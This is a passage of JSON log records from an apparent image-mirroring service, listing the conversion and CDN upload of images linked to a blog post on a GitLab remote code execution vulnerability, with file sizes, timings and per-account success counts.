KB","compressRate":"30.5%"},{"code":1,"isDone":false,"source":"https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-7173be94-ab7d-1.png","sourceStatusCode":200,"destWidth":1426,"destHeight":435,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn87@2020_3/2020/10/20/11-53-04-030_c1ebe391cd8dca8f.webp","sourceBytes":166236,"destBytes":70584,"targetWebpQuality":75,"feedId":30884,"totalSpendMs":5129,"convertSpendMs":172,"createdTime":"2020-10-20 19:52:59","host":"us-024*","referer":"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/","linkMd5ListStr":"322ea70f227c139833b95e7cdc65ae81","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"162.3 KB","destSize":"68.9 KB","compressRate":"42.5%"},{"code":1,"isDone":false,"source":"https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-707e9eb4-ab7d-1.png","sourceStatusCode":200,"destWidth":1251,"destHeight":399,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn95@2020_3/2020/10/20/11-53-05-294_34796b626d05d45b.webp","sourceBytes":231054,"destBytes":65936,"targetWebpQuality":75,"feedId":30884,"totalSpendMs":6558,"convertSpendMs":42,"createdTime":"2020-10-20 19:52:59","host":"europe-25*","referer":"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/","linkMd5ListStr":"322ea70f227c139833b95e7cdc65ae81","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"225.6 KB","destSize":"64.4 KB","compressRate":"28.5%"},{"code":1,"isDone":false,"source":"https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-713cc3ee-ab7d-1.png","sourceStatusCode":200,"destWidth":1397,"destHeight":202,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn76@2020_3/2020/10/20/11-53-05-558_da66354b7c904337.webp","sourceBytes":252012,"destBytes":55378,"targetWebpQuality":75,"feedId":30884,"totalSpendMs":6800,"convertSpendMs":29,"createdTime":"2020-10-20 19:52:59","host":"europe-58*","referer":"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/","linkMd5ListStr":"322ea70f227c139833b95e7cdc65ae81","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"246.1 KB","destSize":"54.1 KB","compressRate":"22%"},{"code":1,"isDone":false,"source":"https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-70a75304-ab7d-1.png","sourceStatusCode":200,"destWidth":1049,"destHeight":440,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn92@2020_6/2020/10/20/11-53-06-620_140195e1ed6327f4.webp","sourceBytes":355376,"destBytes":104276,"targetWebpQuality":75,"feedId":30884,"totalSpendMs":7773,"convertSpendMs":60,"createdTime":"2020-10-20 19:52:59","host":"us-012*","referer":"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/","linkMd5ListStr":"322ea70f227c139833b95e7cdc65ae81","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"347 KB","destSize":"101.8 KB","compressRate":"29.3%"},{"code":1,"isDone":false,"source":"https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-711ddbd2-ab7d-1.png","sourceStatusCode":200,"destWidth":1029,"destHeight":178,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn3@2020_1/2020/10/20/11-53-06-937_d11daacd3c5d8553.webp","sourceBytes":212571,"destBytes":48768,"targetWebpQuality":75,"feedId":30884,"totalSpendMs":7938,"convertSpendMs":25,"createdTime":"2020-10-20 19:52:59","host":"us-51*","referer":"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/","linkMd5ListStr":"322ea70f227c139833b95e7cdc65ae81","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"207.6 KB","destSize":"47.6 KB","compressRate":"22.9%"},{"code":1,"isDone":false,"source":"https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-70fb58d2-ab7d-1.png","sourceStatusCode":200,"destWidth":1248,"destHeight":586,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn12@2020_3/2020/10/20/11-53-07-491_94bd68a9dd39bb7b.webp","sourceBytes":428094,"destBytes":94540,"targetWebpQuality":75,"feedId":30884,"totalSpendMs":8603,"convertSpendMs":71,"createdTime":"2020-10-20 19:52:59","host":"us-016*","referer":"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/","linkMd5ListStr":"322ea70f227c139833b95e7cdc65ae81","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"418.1 KB","destSize":"92.3 KB","compressRate":"22.1%"},{"code":1,"isDone":false,"source":"https://xzfile.aliyuncs.com/media/upload/picture/20180829191948-70d2d358-ab7d-1.png","sourceStatusCode":200,"destWidth":1894,"destHeight":289,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn8@2020_2/2020/10/20/11-53-07-821_cd8205c1835c0813.webp","sourceBytes":400793,"destBytes":92378,"targetWebpQuality":75,"feedId":30884,"totalSpendMs":8925,"convertSpendMs":80,"createdTime":"2020-10-20 19:52:59","host":"us-028*","referer":"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/","linkMd5ListStr":"322ea70f227c139833b95e7cdc65ae81","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"391.4 KB","destSize":"90.2 KB","compressRate":"23%"},{"code":1,"isDone":false,"source":"https://xzfile.aliyuncs.com/media/upload/picture/20180829191950-71a2d4d6-ab7d-1.png","sourceStatusCode":200,"destWidth":1355,"destHeight":635,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn15@2020_6/2020/10/20/11-53-08-239_bd725a510707174b.webp","sourceBytes":455879,"destBytes":113344,"targetWebpQuality":75,"feedId":30884,"totalSpendMs":9397,"convertSpendMs":78,"createdTime":"2020-10-20 19:52:59","host":"us-004*","referer":"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/","linkMd5ListStr":"322ea70f227c139833b95e7cdc65ae81","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"445.2 KB","destSize":"110.7 KB","compressRate":"24.9%"},{"code":1,"isDone":false,"source":"https://xzfile.aliyuncs.com/media/upload/picture/20180829191950-71ea8628-ab7d-1.png","sourceStatusCode":200,"destWidth":1264,"destHeight":595,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn100@2020_3/2020/10/20/11-53-08-095_ff2b179229068f63.webp","sourceBytes":389640,"destBytes":99958,"targetWebpQuality":75,"feedId":30884,"totalSpendMs":9479,"convertSpendMs":68,"createdTime":"2020-10-20 19:52:59","host":"europe63*","referer":"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/","linkMd5ListStr":"322ea70f227c139833b95e7cdc65ae81","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"380.5 KB","destSize":"97.6 KB","compressRate":"25.7%"},{"code":1,"isDone":false,"source":"https://xzfile.aliyuncs.com/media/upload/picture/20180829191949-715755c4-ab7d-1.png","sourceStatusCode":200,"destWidth":757,"destHeight":182,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn84@2020_2/2020/10/20/11-54-05-548_8b6eab1d1b9c086c.webp","sourceBytes":170541,"destBytes":40952,"targetWebpQuality":75,"feedId":30884,"totalSpendMs":6476,"convertSpendMs":17,"createdTime":"2020-10-20 19:54:00","host":"europe-25*","referer":"http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/","linkMd5ListStr":"322ea70f227c139833b95e7cdc65ae81","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"166.5 KB","destSize":"40 KB","compressRate":"24%"}],"successGithubMap":{"myreaderx8":1,"myreaderx25":1,"myreaderx7":1,"myreaderx21":1,"myreaderx10":1,"myreaderx33":1,"myreaderx13":1,"myreaderx24":1,"myreaderx30":1,"myreaderx5oss":1,"myreaderx18":1},"failGithubMap":{"myreaderx14":1}}